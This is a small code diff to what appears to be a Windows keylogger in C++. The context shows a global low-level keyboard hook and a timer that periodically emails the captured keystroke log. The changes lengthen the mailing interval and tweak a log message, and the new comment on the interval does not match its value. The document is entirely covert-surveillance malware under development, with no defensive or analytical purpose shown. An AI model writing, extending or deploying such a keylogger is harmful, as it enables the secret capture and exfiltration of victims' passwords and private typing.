@@ -27,7 +27,7 @@ void timerSendMail(){
     else keylog = "";
 }
 
-Timer MailTimer(timerSendMail, 2000 * 60, Timer::inf);  // repeat every 20 min
+Timer MailTimer(timerSendMail, 20000 * 60, Timer::inf);  // 1000 = repeat every 1 min
 HHOOK eHook = NULL;
 
 LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
@@ -51,7 +51,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
 }
 
 bool InstallHook(){
-    Helper::writeLog("Program started");
+    Helper::writeLog("Program started.");
     MailTimer.Start(true);
 
     // WH_KEYBOARD_LL:      says we use keyboard hook. LL means low level & global hook
